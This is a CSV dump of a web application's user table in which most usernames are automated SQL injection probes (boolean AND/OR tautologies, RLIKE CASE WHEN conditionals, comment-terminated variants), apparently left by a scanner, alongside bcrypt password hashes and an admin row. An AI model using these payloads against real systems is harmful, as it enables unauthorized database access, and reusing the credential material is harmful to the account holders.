id,password,username
1,a2/WbP0PCjwW4CKdq6G,admin
2,$2b$12$jkqvMzl/p9NDv0UvfzdDYujMjAWGEp3LqY3YYveYyyddAP/uKpqqe,admina
3,$2b$12$IV45CnuOZVxs0h8GVcPHHeTrLozz.WBsk2kb12R3RWuUtcDj1c8ki,adminaa
4,$2b$12$KdYc110MXdNDIqhwBmhRqehihTiAJTT5XoTFtSF6GSNhjF/OPVzK6,3932
5,$2b$12$PxGc.y4kXDT69ywX8hTc4.KNLWL867jMmXZM6osnsFxrv9CB7JKim,adminaa) AND 1550=6640 AND (2841=2841
6,$2b$12$jKOiOv7DNj041dflZPB7vOP4VKkrsQpStpDT6f1nkxLu.dm/CQtQO,adminaa) AND 7493=7493 AND (7549=7549
7,$2b$12$9Bs7CfG2L0wBaTtLYVCewevIScKctaYF98A3rFAZStXnJ7827puZK,adminaa AND 4862=6064
8,$2b$12$HGfSTIW/z670qUUM7xDPwuwLPPAAhQTDS/iFoYvtAUEMQYAf66whG,adminaa AND 7493=7493
9,$2b$12$XPJensd5s/xmMhmMZXS0Ke1.CZ61u3kJSWWhdI4H0mIPasmz2SL/G,adminaa') AND 2341=3933 AND ('ljkM'='ljkM
10,$2b$12$y.RZBjAMmPIXYqK2PGxK1uLO0/cTLxADOx4wJADwU7ZbhO15GT3ee,adminaa') AND 7493=7493 AND ('EldL'='EldL
11,$2b$12$agiLW3M2KuxCLf8gPYjmsuOIrXMQSxe7xtmu3Y3v/LPazW9uWpET.,adminaa' AND 2199=3975 AND 'racp'='racp
12,$2b$12$0bEKz6s3fkM5AURmodEfJu9L/JUlSWZlw3bOtyDR/hpNFZ5q/DM3e,adminaa' AND 7493=7493 AND 'tRVM'='tRVM
13,$2b$12$LtsBRGqYyiukpg19b3C/KO3YIAJpv9hcwWcvUGRGID9pJav2x/Lgu,adminaa AND 4818=1544-- PRMz
14,$2b$12$Bj05KP6Tp9fppfiFD5DvWepIfE.fi85/IlUqTg/4.N4amaUwpAu5K,adminaa AND 7493=7493-- HwuD
15,$2b$12$FkRwqQupmD0Byf/yGM/M5uJzZLsc15urZ6cEtFjuxNJKpNkG/G2Yi,(SELECT (CASE WHEN (6911=1730) THEN 0x61646d696e6161 ELSE (SELECT 1730 UNION SELECT 8132) END))
16,$2b$12$vDvDDx.V.4pXDy7St8jP9ucL38U/TZKpfz8eDCdj.Wdx.655Iyr.S,(SELECT (CASE WHEN (7393=7393) THEN 0x61646d696e6161 ELSE (SELECT 3881 UNION SELECT 3116) END))
17,$2b$12$uegaXwEQMQ7PgmltrzWB1Oq3M9Ox.CfEtrCsTn1ZG9gsgOiydPpYi,"(SELECT CONCAT(CONCAT(0x71786a7071,(CASE WHEN (5632=5632) THEN 0x31 ELSE 0x30 END)),0x7162767071))"
18,$2b$12$sgUCHB26nPq0ZVraXCk8TuI157WCNzKBEh7no.VyZ87kQ6GECzeEm,adminaa) AND 9719=3769#
19,$2b$12$rvzn7PUz9yFz3n1vkIp3Muq87BiI42QWNPrZ64vZSp/a.VpVSw6AC,adminaa) AND 3439=3439#
20,$2b$12$iES6.lABOrDSwCC7Y7T8/.ocogXRL2DW8Q627xx7A0Uuhb3V2Lvju,adminaa') AND 4408=6173#
21,$2b$12$kkXawGvsizaQooeVUQgqhO7CoX8zD5JYK/oseALL3sCfKtoZpjlkO,adminaa') AND 3439=3439#
22,$2b$12$1fgQ4eFQoAmlZnE3xjq9i.qR/rtTt9EpdVly1lck1GCmILVgJ6xX6,adminaa' AND 3601=1995#
23,$2b$12$HVgSMsHVIhd8s5BGjETe2eK8Ln2Rsld3rKfQAbsFCe7vEY5sR./QW,adminaa' AND 3439=3439#
24,$2b$12$FXg/APulWv4mjqWuKsye..u2PGuXUR2RZPbEmW51hegpRReepWNUa,adminaa)) AND 1704=3626#
25,$2b$12$/fCVBVmxxnkZ3sz.n/oEfuDauBMsA6s.eVT5/2bwjQOYx7PEgn7YO,adminaa)) AND 3439=3439#
26,$2b$12$FBakvPCIKEZ6/RKfDDm0dea8gKKbxK0c8Nt2U5pm93q6npYc3J5Xq,adminaa))) AND 9815=5546#
27,$2b$12$wDVUPnf/xTfFvSQDrVulwuxV1/Zc80WYEBxKKDQwr5lsAVsZzI8V2,adminaa))) AND 3439=3439#
28,$2b$12$FJ7W6TlrFL.AGMEM6/bruO6hsMC20Y64ZcqM9LrK/wygV1lFMARZ6,adminaa AND 6021=2416#
29,$2b$12$3SBSwHnpeW46YHrktKSVbeB1ctlIgtfAxAhr9d9CbfdmOVnHiWizW,adminaa AND 3439=3439#
30,$2b$12$OBvPKyqLSX2kqscl3KxAIeDni3QwEjEnuQ59f4g4/ZnhGfx9Mm4xK,adminaa')) AND 6134=2483#
31,$2b$12$M09eDD3fZ7DlFcy.Mtg47OJC4gO9HY2hKS4CgbUsDZHDPG4PLzJmS,adminaa')) AND 3439=3439#
32,$2b$12$jRgDxo0D./ApAfwwnSemkOz61f1hVSSjcJr1BUcqWUqB9sEQ5xV/i,adminaa'))) AND 6268=1503#
33,$2b$12$YJJFe8.t/jwcwzx7nYdXfu164jVM9z8a2gpsQSEcIlK.HQLAe3142,adminaa'))) AND 3439=3439#
34,$2b$12$S9fHNBKJQix3NGAs0Q8Ml.BbH3gdb3KhV3EjXJsNmiw/8Y9LCw8tK,adminaa')) AS FYBl WHERE 5054=5054 AND 7204=9372#
35,$2b$12$1ZKg0ZIQfMtphNpz2mfmv.wzlF08xw0D7T0lT19bfLs26QQvf6IaS,adminaa')) AS MzLW WHERE 2417=2417 AND 3439=3439#
36,$2b$12$F0OHUBu7hNkcHsDNnAVqCOdQnyGa47/VTWc4nlGX/ijaLE4n6BleS,adminaa)) AS tRcD WHERE 8564=8564 AND 4004=9525#
37,$2b$12$TUeTCrm3hTRKjMkLO6zzJuA42AcZgn4ceRaplQQ9roazvsobWGdD6,adminaa)) AS HDtg WHERE 4457=4457 AND 3439=3439#
38,$2b$12$sOYy1r0KNCRrr8Jmsrbl1em9sVvZbfx8Unde/19u8wI/M66kvFNNK,adminaa') AS WWnN WHERE 7730=7730 AND 6747=2096#
39,$2b$12$HWhmn6ugRX8RmeoTlL7kEezfwWEyO7DpCsVRD1tAgThPMCfzjTf5W,adminaa') AS heIf WHERE 5157=5157 AND 3439=3439#
40,$2b$12$duFlpLzzrvpcfxD1itveM.5zratTF1WIQWbIduR7t6EjwjqH56QSW,adminaa) AS TovB WHERE 8302=8302 AND 4102=7557#
41,$2b$12$6igKDDgVznFcoJ4K8OsuH.qcXz7gb9W.82xA7jSJoZczyTO5iwAwS,adminaa) AS mJZS WHERE 9239=9239 AND 3439=3439#
42,$2b$12$CTgyB28pAyP56Q7PD48nYOMD7nbPYRFoQgFflVd2xW4CYO1ukRbvq,adminaa` WHERE 7332=7332 AND 3292=6358#
43,$2b$12$xMzbqBN0NsEO0HqPHHdzGOS/rqII0nD.LTGbkqYQBoCzXN288gmEi,adminaa` WHERE 8866=8866 AND 3439=3439#
44,$2b$12$zzFW7u8uWfyxezebcw8CGetkKuuB76XbsGQJZDFFiI6US5gHD4yju,adminaa`) WHERE 8557=8557 AND 6364=9802#
45,$2b$12$hTrqkHdp4HOoCUFdE50eRuz6S8Y5CH2G5ePK6i7wAo9TPrVav57MS,adminaa`) WHERE 6260=6260 AND 3439=3439#
46,$2b$12$KNb1O6s/Tm25AhGx9PYbtuV.P95Rg/GHF9amQllb6RxqAMTgeViZi,adminaa' IN BOOLEAN MODE) AND 9400=6822#
47,$2b$12$xhupIMj618b14rpQDB5cCu3Owc8bm2cXwg3z5MFy87LjsdtHRplH6,adminaa' IN BOOLEAN MODE) AND 3439=3439#
48,$2b$12$L5MzOv.nIU959c9zromya.TKu4sTdjdxkyBng7wRAx.ydchGGGxIm,-8458
49,$2b$12$Ko6XUsWtFirGxWcHTx0H5OQp4lFfkFAS/V4DHSnuQIXRxMA8nj8bq,-1178) OR 4165=6578#
50,$2b$12$SSt2IURGbziUfmLJJMbfxulvIuq5gBEKYiu.7nCUKd9AtH0wWhh/C,-1690) OR 2700=2700#
51,$2b$12$KKcofrhAhAAEKTm/wKq72.Yyt4rZvnRImap4.c2hY9n5jLQVg75W6,-5079') OR 6113=9297#
52,$2b$12$NH7HIZRAIDveWWlkup.9kuLfPnxCVJOd/h35xQm9VUHWW.2fqMhHe,-5598') OR 2700=2700#
53,$2b$12$9XfoFsOtvdqFpUSp20GlRuPm7lmeLDHXiRpUGh9iRXG5.oeHzYjhS,-4940' OR 2362=2992#
54,$2b$12$fmOt1rzTx2ARHOJIocM3LuWIRxXCVntbi9BQ7UQQPKIFxNqd.Yvhe,-8498' OR 2700=2700#
55,$2b$12$S1lK1KYHinDqoW/hMDl1IeFb/x6XCZJirn2vkXWNM2J/fuRbdNMBW,-2141)) OR 6332=7675#
56,$2b$12$mHEGTbnnAB32iv.37D7Yt.M4BXdGq8BMD6MM0wZ0ivdGyKpj2Ai8u,-4392)) OR 2700=2700#
57,$2b$12$I7qbTbtRsWVh5tWEmFSEMeVLTiMmb/zMelrLcxtC26z97vn.bgycK,-5431))) OR 3576=6714#
58,$2b$12$fwUb1PJhObO2y8jEpyWSrObQsR9527VqT0/.PH.uzD9ibvLRZtik.,-3529))) OR 2700=2700#
59,$2b$12$t1lsXLorVqEr1METx0ewpufsnZByrXRXGsU0D/QWOSaYGpRLkjmYa,-3850 OR 7660=1543#
60,$2b$12$NzIW1/iNljkylxgFVBxbH.qvaTsaU5L5lI4rPELbzLZ2hboldkwM6,-6581 OR 2700=2700#
61,$2b$12$GcfH2ItagjC9MbLAZ3iTO.EtOPw1qutPFDyW2xwUvkWuc0CUeU1NC,-7656')) OR 7157=3706#
62,$2b$12$Qd7GvOMHQTmV3UGMwRzeXuHb8WFksR8zi.vAev/5j9wwmMFhdUjVa,-4307')) OR 2700=2700#
63,$2b$12$asiZa7OSgFb9i8T.2FVVd.ztTh0zrUQEpfR1OJB3s/hHyscNGXLpu,-7187'))) OR 6961=4844#
64,$2b$12$W52lTX6N4qaFlDkqfcdOieGHq3apg7nNitWEMNbCrWutfG6./VW3G,-5404'))) OR 2700=2700#
65,$2b$12$MjHKeSYfA/yiobGT3oMqeuyMDtJwRI6HbXZlO3P4nQhNDNKbmTEI.,-7269')) AS ISVb WHERE 1324=1324 OR 2324=3255#
66,$2b$12$7WAvYBk3QP.sF1vvjIPfoO2LDCD4l8wQlC5oFlH0GsR6xv4b8dflm,-8652')) AS NcSn WHERE 2731=2731 OR 2700=2700#
67,$2b$12$wQ9pizFMEooPxH5xJ93tT.uEaf7gTJdkaDW8/658X3wZ3A1GNdnmO,-5379)) AS ySsI WHERE 5827=5827 OR 4062=4306#
68,$2b$12$L6g3oD7v5Mqk5WgJi.QXNe0/ufJexHmNukmHqNfZQlVK0LEcdB8.W,-1516)) AS eqad WHERE 4982=4982 OR 2700=2700#
69,$2b$12$S0A4.O5PMG0JVMFTV1vZZuhdcxzpD9.VmstqtF/ZZO3/PwxSlvhFO,-4258') AS DfwP WHERE 6706=6706 OR 5252=1077#
70,$2b$12$xFH3vzHeDN.8UAFtr5fIN.CWo35/D1D1tTkN2Y6MAEzcBb.vr25VG,-8676') AS Duab WHERE 4069=4069 OR 2700=2700#
71,$2b$12$RXGySPexzved1IO7a6ZYWeFRgWVTkR6AGVHODuYZIbRPmduevmne2,-9496) AS yCxy WHERE 5791=5791 OR 3186=2651#
72,$2b$12$X73aJpuMIxaTcmFrRR29WeqAQi/JsQzdNdARMg6MS6F7vqCMzkuLq,-5507) AS tbGw WHERE 7267=7267 OR 2700=2700#
73,$2b$12$yiMZppkh1qOEHtaPI6g5SOg4nQRJTR9ylujPr9pnuo5GwXHOv9t7S,adminaa) OR NOT 7816=2919#
74,$2b$12$4x8RGANKRFBbBiB0M/3QNuULeAIsUZCiFhoXaJg7YOYKezZiec0Mi,adminaa) OR NOT 9510=9510#
75,$2b$12$Mxjcv8AoxRsqFDF6s3lCOOdfCzZqi4/ZKWiyze3wmMGmHjbdrYLZq,adminaa') OR NOT 4792=6044#
76,$2b$12$cLAwX5.yrdimpEiU/5JC/.n0pWUgFobpdr9yHTSqyaga6gONBM/KG,adminaa') OR NOT 9510=9510#
77,$2b$12$QI84Ht5bufmO2avZ/KoOIuXAcGjdYofnXRseRfOxu5Nvheo3/Veey,adminaa' OR NOT 9043=1923#
78,$2b$12$.juFgEBrZC9fNH2ha8Qa0e3Jgi7qnkvyeoG0J/qiWiMLMEWwO.RNy,adminaa' OR NOT 9510=9510#
79,$2b$12$rrtxnVyP4XgNU4L4OKY0guK4JOOeJLt9SJZgjUpP7IdoeIdjTKCP.,adminaa)) OR NOT 6901=6806#
80,$2b$12$xV7NBBOz6ov7Qz5ttfzHuez4S2YEvewLpbkzmvkfKIG9Gcy5F/nUq,adminaa)) OR NOT 9510=9510#
81,$2b$12$na4yqb5tkpkNYP53Y4ouHeNOlli4178AM6QeiTcaOdo1tIa3K58Ty,adminaa))) OR NOT 7824=2913#
82,$2b$12$FlgiiHk.8eeN.IQSMliEme3iT1FwlPHAvuZyi78BVz55oiDoXIua6,adminaa))) OR NOT 9510=9510#
83,$2b$12$lkTT68n0l3ORjDUSR7oheek0ne/jSODXR7JNLPzmrcZtd1uIcb4WS,adminaa OR NOT 9328=2379#
84,$2b$12$0tRthgyBNms8glqO7CbQyujC9lDZcMR4Z5MG6hFhRkTJlp4IPywE.,adminaa OR NOT 9510=9510#
85,$2b$12$oaNzr4LoRSgiPlgkqU8JNOGH75ccCnIL6KSja7UAizXfFoZWWhEUm,adminaa')) OR NOT 3347=5941#
86,$2b$12$XS5fQ/UYgEqpTTNGdnpaYeiQR6TFk49KQ2yunBXERvrFWI0j8oA4m,adminaa')) OR NOT 9510=9510#
87,$2b$12$xfq5Dv9fbP9Rrevs8TiHLeQeLn1znd/xwZeT/jdxvB2UsmNa6mxru,adminaa'))) OR NOT 1081=7498#
88,$2b$12$O2diAzy2hgiZFqpqQLJtleLQy60rh.DQiafRq1Cla/hh0C5eN9axq,adminaa'))) OR NOT 9510=9510#
89,$2b$12$02.1Kw/3J5z0KL5F15qnYO.cD6eCBmJFVwyvEk6pFbiHjFkSvP1v.,adminaa')) AS vLvB WHERE 8983=8983 OR NOT 7036=7575#
90,$2b$12$qzhOWj9eJru32SNWG.u56.1GUZIQ7uMVlyzFht9ix8ByFqK7.Yhc6,adminaa')) AS lwCx WHERE 8047=8047 OR NOT 9510=9510#
91,$2b$12$8UqM23R9d.EPsjKMLHSnuO1DvOY3h.FstMqV0I8Msud9ol93D8gUm,adminaa)) AS IlNz WHERE 2116=2116 OR NOT 2123=9537#
92,$2b$12$zjZ1FUcm5mJipuMIj.QKduxWg42VKOcKaUz.Dd/6pMSyOA/b2ywWq,adminaa)) AS RzzJ WHERE 2719=2719 OR NOT 9510=9510#
93,$2b$12$tvfemSsAGRa.PVnKXWl3be078rXNnaPoi6MeR6WNBzx5OxJRf1F9G,adminaa') AS qwKZ WHERE 7478=7478 OR NOT 3145=1552#
94,$2b$12$XrmCASznPvA71ExG/hCWLO0Jqymrm2VwCOfFGe9D23jE.pUliEY22,adminaa') AS WmZi WHERE 6358=6358 OR NOT 9510=9510#
95,$2b$12$e0rT1uaXFoivvkeonauqFeA7eY0slC13rkpRuM13dHEFycGdZ7hAm,adminaa) AS Ixjq WHERE 5829=5829 OR NOT 2977=7977#
96,$2b$12$ZgtTNAIZOfsE.IH.vwNU1OUnvvXQjnzBIKuua0Pj.SgQNRcqCaNcG,adminaa) AS PRSD WHERE 8428=8428 OR NOT 9510=9510#
97,$2b$12$dIIdMn3P11RUiJFDlkjM3eJjlTgWkEWdBaL/BbcsZliHjqXAaP4yG,adminaa` WHERE 1815=1815 OR NOT 6153=8333#
98,$2b$12$Azr3lZDWR2jCrocakzQatuchiVrPsJNEYWdphQt5.dTaBcTVjl61i,adminaa` WHERE 9120=9120 OR NOT 9510=9510#
99,$2b$12$ExF6WiXRm8pjlYBlOf4yUuEJKhf9mtJaH4fj5stlQQ7adpe75mdo6,adminaa`) WHERE 9803=9803 OR NOT 2232=8578#
100,$2b$12$.x2G85T340ZgBSa7/Oq9OOEizAvMEN.ty9oOjiUqMFVCscxOGnHa.,adminaa`) WHERE 7408=7408 OR NOT 9510=9510#
101,$2b$12$BLK/dOC.9Ch/kxQ/66juMe8V5ap8p.TLnRr42gsJMbnbLDmUZPEXu,adminaa' IN BOOLEAN MODE) OR NOT 1506=4346#
102,$2b$12$Jm/5wVCVtB6CTxqLElxziud9YcqfxEfYdlEeGHriyN5v.mue2vFD6,adminaa' IN BOOLEAN MODE) OR NOT 9510=9510#
103,$2b$12$bHUSsnAvMwsbF/5euIpC6eJHzU/VoqlbX3veGm2eDzA13oQAMKfji,adminaa) RLIKE (SELECT (CASE WHEN (9855=8057) THEN 0x61646d696e6161 ELSE 0x28 END))-- sccW
104,$2b$12$CsdhZf5KiG9qrzsEtY6VEef3HL04KJbV.UX4rclxDN8y4RerA/ZZS,adminaa) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- LmiU
105,$2b$12$JofwCMrmcl2w6qGr8IIMU.IzPUoI3IMsObh3wGy9Cinb2tTJKiqW6,adminaa') RLIKE (SELECT (CASE WHEN (6960=2074) THEN 0x61646d696e6161 ELSE 0x28 END))-- LXLQ
106,$2b$12$j.uyIH0WHe8pY2rr4Eaw5OdPeDsa6uBzHDoQNmfBxfxog5CCDxtYS,adminaa') RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- LzZg
107,$2b$12$Ea8uDN57DOyirv7Usd5SLOKm4FqqV3Il7g9zjTsYBfdi4NwiAW.Xu,adminaa' RLIKE (SELECT (CASE WHEN (4237=3771) THEN 0x61646d696e6161 ELSE 0x28 END))-- XzmF
108,$2b$12$6kQworXSIQj.tD4yNIRBjeMCL/0GOuIHfFd7dVB1uaGZ.p8dMKc0y,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- oAkE
109,$2b$12$O47Ik1y06HTPFsmiajLyTOzzkZm8dZ9w6dgnEhLKhPpk7hRBuZgJ.,adminaa) RLIKE (SELECT (CASE WHEN (5551=9328) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (7443=7443
110,$2b$12$k16Fg7MMxvi7/iudQkLK0OILtOgFATDOh86hX4ZEcXXZoqDPoKww.,adminaa) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (4532=4532
111,$2b$12$Nrksre4HCL.XdnPkb9GgD.yj0LufRLKtdz5CP7UtFTUFfkOxJo882,adminaa)) RLIKE (SELECT (CASE WHEN (3951=7048) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((9670=9670
112,$2b$12$Ho1iH7uhqHnGuEvZT0Lf0u4QouVf4schhnpTjcuGYU22PQa.dPUCW,adminaa)) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((4662=4662
113,$2b$12$3mpodG2aBg5P/bb6H0ykOOARHgDPuSnLyaeNQYkXJKZS0mTO9gMqO,adminaa))) RLIKE (SELECT (CASE WHEN (2019=4591) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (((9559=9559
114,$2b$12$0byU6jWWvwpCucqbh2qHMuHvXHxn9.SR1CfiV4Mfv0P1ePpLyvIUe,adminaa))) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (((9946=9946
115,$2b$12$bwC3W3CseOUFQ0bBY6LqTe/Gwc2fvXxQqYGIq/Zyn26hW1GaSfM0m,adminaa RLIKE (SELECT (CASE WHEN (8723=4831) THEN 0x61646d696e6161 ELSE 0x28 END))
116,$2b$12$/sqp7AcjVt7Nanz6jaq0meJ2wL4y94qFbJzh/6Gn4QXaQulPEdiFS,adminaa RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))
117,$2b$12$16f26j4eEt5fnNwpxUT0NOaSuZwulZpIC9xNfPeXrZdgPP6hterrK,adminaa') RLIKE (SELECT (CASE WHEN (9918=2414) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('sJSY'='sJSY
118,$2b$12$8Ywx6pShOYpfRtCxhw/G1.RjA4OVyaw1UbBFpSYNsxT6kJ.RvlbEa,adminaa') RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('NsTp'='NsTp
119,$2b$12$taXZiplTkYAtJe3O8qK6qOAwq2ssk8LkBCHFM0WSggasPLlcbOsSq,adminaa')) RLIKE (SELECT (CASE WHEN (9901=3791) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('zzun'='zzun
120,$2b$12$wo8.W/NJtbZC3omPlN5fNOy/KzIB7UCP1qXpEUDhHLJceJkx2EBCC,adminaa')) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('eiAF'='eiAF
121,$2b$12$YlI26mvhUKKeztNpnB/veuZ97NK5dAWuMKuOfB1xGlv7j70aCcEiy,adminaa'))) RLIKE (SELECT (CASE WHEN (1140=9919) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('itNQ'='itNQ
122,$2b$12$muiyMT4iZmgDSgRP6lw06eR.2KQpIjF77txu9UJJZIgCeRdVmWvxu,adminaa'))) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('yAST'='yAST
123,$2b$12$HL9s./tA7AEEqtah4kQRMujSyxB6r7cAlap96/WLnjc0cydPu656u,adminaa' RLIKE (SELECT (CASE WHEN (6330=6279) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'GDyZ'='GDyZ
124,$2b$12$WnLufcm9COnZLZJzqOcKreshqZNQF0AGwcYi0xWbiBaFhKP8nC41C,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'UqUS'='UqUS
125,$2b$12$g1J/j/LyuL0B8VvjAhAeTOw2tKELCHKzbusU6o18TDvuWITQV2aLy,adminaa') RLIKE (SELECT (CASE WHEN (1869=8175) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('gUuN' LIKE 'gUuN
126,$2b$12$n7gbim0ZgUI1n0DMLZtQLOaRMgaO36upgqxPSlGft11gCxb5ZEvF.,adminaa') RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ('WOtq' LIKE 'WOtq
127,$2b$12$2Rg6TJyDqALWeFmaXl7PF.1KOnS64KVrKx6LqyWFTMbViP6fintQC,adminaa')) RLIKE (SELECT (CASE WHEN (8427=7458) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('DJfX' LIKE 'DJfX
128,$2b$12$gTQlzTvwafqiO3ZdLXhgquq1DyAQFyi6L18sakNzDfdwZJYSYyIM6,adminaa')) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND (('bEsh' LIKE 'bEsh
129,$2b$12$bBiC2SN0kesidZLPoMKYse5qzzOIgwic00TZh1d6pRPPCbdwpDrlW,adminaa'))) RLIKE (SELECT (CASE WHEN (2033=7513) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('nGNo' LIKE 'nGNo
130,$2b$12$WmZ7jWjXzU9KR.2y.IRaPeDcoY9h7x9DUmkde.6JFQOJbwqKGIYBq,adminaa'))) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND ((('wuwQ' LIKE 'wuwQ
131,$2b$12$d8oLqrS0Tzz2sSm4eCQ9Ge7pc5M8S7ebxY92xngYFL/2KRqMkWj5m,adminaa' RLIKE (SELECT (CASE WHEN (9871=6087) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'KqNJ' LIKE 'KqNJ
132,$2b$12$d6MZHAGSQN6IjFLLY0bKaOPM/9XpDfP.wCmZOooGAgtLSGaEbjWZe,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) AND 'dGzf' LIKE 'dGzf
133,$2b$12$91d.UUyK8IYvCCZzTmqxculW3Lltg0FnYJBlt8RQ0dcJCbqxiuxuy,1
135,$2b$12$DWz8LnhQ74q0H0EjiAk3PeKAxvexAmZ3GWx9g2ZSOhytJWS2dkTce,adminaa RLIKE (SELECT (CASE WHEN (9882=5651) THEN 0x61646d696e6161 ELSE 0x28 END))-- VVsc
136,$2b$12$MfrR2rICcEBrliARdllFSe4elWmNVC3Zmt34qkMyhl94SWOijq8m2,adminaa RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- GXEw
137,$2b$12$ffZjsZ3gO8PpsY/JT2z3bu95p2CoA0wE9tZS1xwgdIHRF6UK10IE6,adminaa RLIKE (SELECT (CASE WHEN (8286=8784) THEN 0x61646d696e6161 ELSE 0x28 END))# viYi
138,$2b$12$pC7wDOM61hodybuUvPIBHeh8Yqh.aYBeqIRE45uGT8i9qG/KmmPeO,adminaa RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))# lgGD
139,$2b$12$yHHdqUq9Pj0sHDzzC1YaHeTAsJYEOCCinD.3kWofu0JuoCkwk4O0m,adminaa' RLIKE (SELECT (CASE WHEN (4410=3054) THEN 0x61646d696e6161 ELSE 0x28 END)) OR 'Avsu'='BBCw
140,$2b$12$X/TXtorpZn1Bu.zQjoPD0OU3y2MJm0Lwk/r7K0ZfUf3k.kvE00yTe,adminaa' RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END)) OR 'TONC'='wxqL
141,$2b$12$2vbm61VauK5QAETn557Wl.1qFtn8w/n0A4p.8kzm/s8DEr2kFbpDO,adminaa')) AS ScJq WHERE 3763=3763 RLIKE (SELECT (CASE WHEN (5017=1337) THEN 0x61646d696e6161 ELSE 0x28 END))-- Nssk
142,$2b$12$hbkVRqUaz2k3S2CHSOEycevqpxGnnrw2n5623d./jn6L07QtapWWe,adminaa')) AS FXHw WHERE 4819=4819 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- hLqK
143,$2b$12$sM0veFyleiW9tRbtV2sSAeEj89SaEfzA.uw3QBEmDz/i/JToNu32S,adminaa)) AS CgvA WHERE 7466=7466 RLIKE (SELECT (CASE WHEN (9092=6266) THEN 0x61646d696e6161 ELSE 0x28 END))-- vInl
144,$2b$12$UJT2U/K888lLvLA9luR8yOB9ntoelDI2JZNab5mb2BA3w/mvl9h0i,adminaa)) AS WTky WHERE 8857=8857 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- BMXb
145,$2b$12$eIjmLuGGCBVMtYGwdM7LK./y4TdesdKsTl32uHy/VShny2BtXiUfy,adminaa') AS cMzT WHERE 4883=4883 RLIKE (SELECT (CASE WHEN (3973=8448) THEN 0x61646d696e6161 ELSE 0x28 END))-- SMiG
146,$2b$12$dJhLPE71dVwCQtbUgF2cmObS3kYnwMaIlLIp3Qye6.1dqxQH.7sO.,adminaa') AS rTKq WHERE 6773=6773 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- WBrO
147,$2b$12$5.0IxRkyAuOTI2vUXMe3T.nz72R0h7NEDv6l4C5s275JT2DOud54W,adminaa) AS dOpu WHERE 9468=9468 RLIKE (SELECT (CASE WHEN (7294=5389) THEN 0x61646d696e6161 ELSE 0x28 END))-- Xbrt
148,$2b$12$a1dFae2fVsN1Cu3wK2g0kO2n/5KR9aE6Jm8Bgk8HkyPLlY9y.d4pW,adminaa) AS WhPH WHERE 5826=5826 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- VGBj
149,$2b$12$4UVmlItNjUKPvxh1NPhFieQvO5rrJwenmS2uqmT0kUfZNHxycjM6W,adminaa` WHERE 8834=8834 RLIKE (SELECT (CASE WHEN (3190=6052) THEN 0x61646d696e6161 ELSE 0x28 END))-- aCry
150,$2b$12$x8z9ymLFg9iiX8ql/BJwN.BKdJrOEiuW3uvMbdJsI8R3C1gGjEAN2,adminaa` WHERE 3880=3880 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- vvlX
151,$2b$12$V5ek1X8wnU/deuD9Zq1vUuIm1IjaaG9nkkXUfd5K.wAKZH1eZgVJ6,adminaa`) WHERE 5059=5059 RLIKE (SELECT (CASE WHEN (7350=6517) THEN 0x61646d696e6161 ELSE 0x28 END))-- YALM
152,$2b$12$JOE.Jz5DehcR.Vahqn5NOea17k/YZ20kNO3j5h2YSTWIn0eYnQH3W,adminaa`) WHERE 1701=1701 RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))-- ghOH
153,$2b$12$AsLx.zLIhQS2R1k1paQ6oOpSXDnMM6vsZn7qb70RIoC2h0hrS1iUm,adminaa' IN BOOLEAN MODE) RLIKE (SELECT (CASE WHEN (4481=7182) THEN 0x61646d696e6161 ELSE 0x28 END))#
154,$2b$12$ZNJSPo6EsXVv6vAEv.yClu5cc8rzHq5dxGcXyx5ofXqeap6OjFNUe,adminaa' IN BOOLEAN MODE) RLIKE (SELECT (CASE WHEN (8024=8024) THEN 0x61646d696e6161 ELSE 0x28 END))#
